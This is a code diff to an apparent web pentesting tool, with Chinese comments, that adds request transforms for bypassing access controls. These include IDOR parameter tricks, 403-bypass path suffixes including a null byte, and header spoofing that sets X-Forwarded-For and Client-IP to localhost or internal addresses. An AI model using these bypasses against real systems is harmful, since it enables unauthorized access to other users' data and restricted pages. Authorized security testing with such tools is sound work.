@@ -9,8 +9,60 @@ import random
 import string
 import re
 import json
-from typing import Dict, List, Any, Callable, Optional
+from typing import Dict, List, Any, Callable, Optional, Tuple
 from dataclasses import dataclass
+from urllib.parse import quote
+
+
+def encode_param_list(key: str, values: List[Any], style: str = 'bracket') -> List[Tuple[str, str]]:
+    """
+    编码列表参数，支持多种格式
+    
+    Args:
+        key: 参数名
+        values: 参数值列表
+        style: 编码风格
+            - 'bracket': key[]=value (PHP 风格)
+            - 'indexed': key[0]=value&key[1]=value
+            - 'plain': key=value1&key=value2
+    
+    Returns:
+        [(key, value), ...] 格式的列表
+    """
+    result = []
+    if style == 'bracket':
+        for v in values:
+            result.append((f"{key}[]", str(v)))
+    elif style == 'indexed':
+        for i, v in enumerate(values):
+            result.append((f"{key}[{i}]", str(v)))
+    else:
+        for v in values:
+            result.append((key, str(v)))
+    return result
+
+
+def encode_params_with_arrays(params: Dict[str, Any]) -> str:
+    """
+    编码参数字典，支持列表格式
+    
+    正确的格式：
+    - 普通参数: key1=value1
+    - 数组参数: key[]=value (PHP 风格)
+    - 重复参数: key=value1&key=value2
+    """
+    pairs = []
+    for key, value in params.items():
+        if isinstance(value, list):
+            pairs.extend(encode_param_list(key, value, 'bracket'))
+        elif isinstance(value, str) and value.startswith('[[BYPASS_ARRAY]]'):
+            actual_value = value.replace('[[BYPASS_ARRAY]]', '')
+            pairs.append((f"{key}[]", actual_value))
+        elif isinstance(value, str) and '&' in value and '=' in value:
+            pairs.append((key, value))
+        else:
+            pairs.append((key, str(value)))
+    return '&'.join(f"{quote(k, safe='')}={quote(str(v), safe='')}" for k, v in pairs)
 
 
 @dataclass
@@ -52,25 +104,51 @@ class BypassTechniques:
         return random.choice(agents)
     
     @staticmethod
+    def get_trusted_ips() -> List[str]:
+        """获取可信内网 IP 列表"""
+        return [
+            '127.0.0.1',
+            'localhost',
+            '10.0.0.1',
+            '10.0.0.0',
+            '10.255.255.255',
+            '172.16.0.0',
+            '172.16.255.255',
+            '192.168.0.0',
+            '192.168.255.255',
+            '169.254.0.0',
+            '0.0.0.0',
+        ]
+    
+    @staticmethod
     def get_all_techniques() -> List[BypassTechnique]:
         """获取所有 Bypass 技术"""
         return [
             # ========== IDOR Parameter Manipulation ==========
             BypassTechnique(
                 name="IDOR - Array Wrap",
-                description="参数数组包装绕过 IDOR",
+                description="参数数组包装绕过 IDOR (ASP.NET MVC)",
                 bypass_type="parameter",
                 apply_func=lambda original: {
-                    'params': {k: [v] for k, v in original.get('params', {}).items()}
+                    'params': {k: f"[[BYPASS_ARRAY]]{v}" for k, v in original.get('params', {}).items()}
                 },
                 category="idor"
             ),
             BypassTechnique(
                 name="IDOR - PHP Array Syntax",
-                description="PHP 数组语法绕过",
+                description="PHP 数组语法绕过 user[]=value",
                 bypass_type="parameter",
                 apply_func=lambda original: {
-                    'params': {k: f"{v}[]" for k, v in original.get('params', {}).items()}
+                    'params': {f"{k}[]": v for k, v in original.get('params', {}).items()}
+                },
+                category="idor"
+            ),
+            BypassTechnique(
+                name="IDOR - Bracket Notation",
+                description="方括号数组记号绕过",
+                bypass_type="parameter",
+                apply_func=lambda original: {
+                    'params': {f"{k}[0]": v for k, v in original.get('params', {}).items()}
                 },
                 category="idor"
             ),
@@ -79,7 +157,8 @@ class BypassTechniques:
                 description="JSON 嵌套混淆绕过",
                 bypass_type="body",
                 apply_func=lambda original: {
-                    'data': json.dumps({k: {"value": v} for k, v in original.get('params', {}).items()}) if original.get('params') else '{"value":1}'
+                    'data': json.dumps({k: {"value": v} for k, v in original.get('params', {}).items()}) if original.get('params') else '{"value":1}',
+                    'headers': {'Content-Type': 'application/json'}
                 },
                 category="idor"
             ),
@@ -88,7 +167,8 @@ class BypassTechniques:
                 description="JSON 包装绕过",
                 bypass_type="body",
                 apply_func=lambda original: {
-                    'data': json.dumps({"data": original.get('params', {})}) if original.get('params') else '{"data":{}}'
+                    'data': json.dumps({"data": original.get('params', {})}) if original.get('params') else '{"data":{}}',
+                    'headers': {'Content-Type': 'application/json'}
                 },
                 category="idor"
             ),
@@ -124,7 +204,7 @@ class BypassTechniques:
                 description="参数污染 (同一参数多个值)",
                 bypass_type="parameter",
                 apply_func=lambda original: {
-                    'params': {k: f"{v}&{k}={v}" for k, v in original.get('params', {}).items()}
+                    'params': {k: [v, v] for k, v in original.get('params', {}).items()}
                 },
                 category="idor"
             ),
@@ -220,6 +300,51 @@ class BypassTechniques:
                 },
                 category="403"
             ),
+            BypassTechnique(
+                name="403 - Add .yaml to path",
+                description="添加 .yaml 后缀绕过",
+                bypass_type="path",
+                apply_func=lambda original: {
+                    'path': original.get('path', '').rstrip('/') + '.yaml'
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="403 - Add .txt to path",
+                description="添加 .txt 后缀绕过",
+                bypass_type="path",
+                apply_func=lambda original: {
+                    'path': original.get('path', '').rstrip('/') + '.txt'
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="403 - Add .jsp to path",
+                description="添加 .jsp 后缀绕过",
+                bypass_type="path",
+                apply_func=lambda original: {
+                    'path': original.get('path', '').rstrip('/') + '.jsp'
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="403 - Add %00.json to path",
+                description="空字节截断 + JSON 后缀绕过",
+                bypass_type="path",
+                apply_func=lambda original: {
+                    'path': original.get('path', '').rstrip('/') + '%00.json'
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="403 - Add trailing / to path",
+                description="添加尾部斜杠绕过",
+                bypass_type="path",
+                apply_func=lambda original: {
+                    'path': original.get('path', '').rstrip('/') + '/'
+                },
+                category="403"
+            ),
 
             # ========== Header Bypass ==========
             BypassTechnique(
@@ -237,6 +362,42 @@ class BypassTechniques:
                 bypass_type="header",
                 apply_func=lambda original: {
                     'headers': {'X-Real-IP': BypassTechniques.get_random_ip()}
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="Header - X-Real-IP Localhost",
+                description="X-Real-IP 头使用 localhost",
+                bypass_type="header",
+                apply_func=lambda original: {
+                    'headers': {'X-Real-IP': '127.0.0.1'}
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="Header - X-Forwarded-For Localhost",
+                description="X-Forwarded-For 头使用 127.0.0.1",
+                bypass_type="header",
+                apply_func=lambda original: {
+                    'headers': {'X-Forwarded-For': '127.0.0.1'}
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="Header - X-Forwarded-For 10.0.0.1",
+                description="X-Forwarded-For 头使用内网 IP",
+                bypass_type="header",
+                apply_func=lambda original: {
+                    'headers': {'X-Forwarded-For': '10.0.0.1'}
+                },
+                category="403"
+            ),
+            BypassTechnique(
+                name="Header - Client-IP Localhost",
+                description="Client-IP 头使用 localhost",
+                bypass_type="header",
+                apply_func=lambda original: {
+                    'headers': {'Client-IP': '127.0.0.1'}
                 },
                 category="403"
             ),
